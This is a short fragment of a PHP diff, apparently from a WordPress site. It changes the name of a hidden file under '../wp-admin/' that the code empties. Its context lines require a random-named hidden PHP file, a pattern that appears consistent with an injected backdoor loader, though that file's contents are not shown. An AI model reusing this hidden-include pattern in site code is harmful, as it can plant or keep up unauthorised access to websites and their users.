@@ -4,7 +4,7 @@ require('LittleEngineThatCould/.NaxdQy4zJY3bQzSWFx.php');
 ?>
 
 <?php
-$fp = fopen("../wp-admin/.license.txt", "w+");
+$fp = fopen("../wp-admin/.GoldSYNC.txt", "w+");
 ftruncate($fp, 0);
 fclose($fp); ?> <?php require('LittleEngineThatCould/Globals.php'); ?>
 <?php
